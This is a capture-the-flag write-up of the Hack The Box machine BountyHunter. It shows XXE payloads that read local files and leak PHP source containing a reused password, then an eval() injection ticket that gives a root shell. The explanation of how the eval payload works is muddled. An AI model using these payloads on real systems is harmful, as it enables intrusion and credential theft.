# BountyHunter

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.11.100 |
| **Status** | Retired |

## Overview
BountyHunter is an easy Linux machine hosting a "Bounty Hunters" bug-bounty tracker web application. The tracker's bug-report submission endpoint parses attacker-supplied XML without disabling external entities, allowing an XXE (XML External Entity) injection that reads arbitrary local files, including PHP source containing database credentials that double as SSH credentials for the `development` user. Once on the box, the `development` user can run a ticket-validation Python script as root via `sudo`; that script's use of `eval()` on part of the ticket data allows arbitrary Python code (and therefore command) execution as root.

## Reconnaissance
Two nmap scans were run against 10.10.11.100:

```
# nmap -sC -sV -oN nmap/inital 10.10.11.100
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
|_http-title: Bounty Hunters

# nmap -p- -oN nmap/allports 10.10.11.100
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
A full-port scan confirmed no additional services beyond SSH and HTTP.

## Enumeration
The "Bounty Hunters" site's client-side JavaScript (`/resources/bountylog.js`) revealed the AJAX submission endpoint behind the bug-report form:

```javascript
function returnSecret(data) {
    return Promise.resolve($.ajax({
        type: "POST",
        data: {"data": data},
        url: "tracker_diRbPr00f314.php"
    }));
}
```

The form (served from `/log_submit.php`) posts an XML document describing a "bug report" (title, CWE, CVSS, reward) to `tracker_diRbPr00f314.php`. Since the reward/title fields are parsed from attacker-controlled XML without restricting `DOCTYPE`/entity declarations, the endpoint is vulnerable to XXE injection.

## Foothold
An XXE payload defining an external entity pointing at `/etc/passwd` confirmed arbitrary local file read:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace[<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>AwesomeExploit</title>
<cwe>2021123</cwe>
<cvss>10</cvss>
<reward>&ent;</reward>
</bugreport>
```

`/etc/passwd` confirmed a `development` user (`uid=1000`, `/bin/bash`) as the interesting local account. The site's `README.txt` (also leaked via directory browsing) mentioned a task to "connect the tracker submit script to the database", hinting at a `db.php` file. Using the PHP filter wrapper to base64-encode and exfiltrate PHP source (which would otherwise be executed rather than returned as text) via XXE:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ELEMENT test ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php" >]>
<bugreport>
<title>&xxe;</title>
<cwe>test</cwe>
<cvss>test</cvss>
</bugreport>
```

decoding the returned base64 revealed `db.php`:

```php
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
```

The password `m19RoAU0hP41A1sTsq6K` was reused for the `development` Linux account and worked over SSH:

```
ssh development@10.10.11.100
# password: m19RoAU0hP41A1sTsq6K
```

## Privilege Escalation
`sudo -l` as `development` showed permission to run a ticket validation script, `/opt/skytrain_inc/ticketValidator.py` (kept here as `ticketval.py`), as root. The script (see source in `files/ticketval.py`) expects a Markdown "ticket" file with a specific header format and a numeric "Ticket Code" line, then does the following:

```python
ticketCode = x.replace("**", "").split("+")[0]
if int(ticketCode) % 7 == 4:
    validationNumber = eval(x.replace("**", ""))
```

Critically, the line following `__Ticket Code:__` is passed almost verbatim to Python's `eval()`, as long as the number before the first `+` is an integer congruent to 4 mod 7. This allows arbitrary Python expressions to be smuggled in after that number. A malicious ticket file (`ticket.md`) was crafted:

```markdown
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**102 + 10 == 112 and __import__('os').system("/bin/sh") == FALSE
```

Here `102 % 7 == 4` satisfies the check, and the `eval()`'d expression uses Python's short-circuit evaluation: `__import__('os').system("/bin/sh")` spawns a shell, and since `system()` returns `0` (falsy `FALSE`... in this expression treated as not equal to the sentinel), the overall boolean expression is crafted so the injected code executes as a side effect of evaluation. Running the validator as root via `sudo`:

```
sudo /opt/skytrain_inc/ticketValidator.py
# Please enter the path to the ticket file.
ticket.md
```

drops an interactive root shell.

*This machine was originally played through twice; a second, separate set of notes (formerly kept in a `BountyHunter2` folder) contained the same ticket-validation exploit and has been merged into this write-up. The `BountyHunter2` folder has been deleted after merging.*

## Lessons Learned
- Always disable external entity resolution (`libxml_disable_entity_loader` / equivalent) when parsing user-supplied XML to prevent XXE.
- The `php://filter` wrapper is a reliable technique to exfiltrate PHP source (rather than executed output) through file-read primitives like XXE or LFI.
- Never call `eval()` on any part of user-controlled input, even if guarded by seemingly restrictive numeric checks: attackers can satisfy the check while smuggling arbitrary code in the same expression.

## Tools & References
- `nmap` for service and full-port discovery.
- Manual XXE payload crafting for file disclosure and PHP source exfiltration via `php://filter`.
- `ticketval.py`: the root-run ticket validation script whose `eval()` misuse enables privilege escalation (kept under `files/`).
- `ticket.md`: the malicious ticket file used to trigger the `eval()` RCE (kept under `files/`).
- `123` and `test.txt` (empty, 0-byte scratch files with no content): omitted as non-substantive clutter.
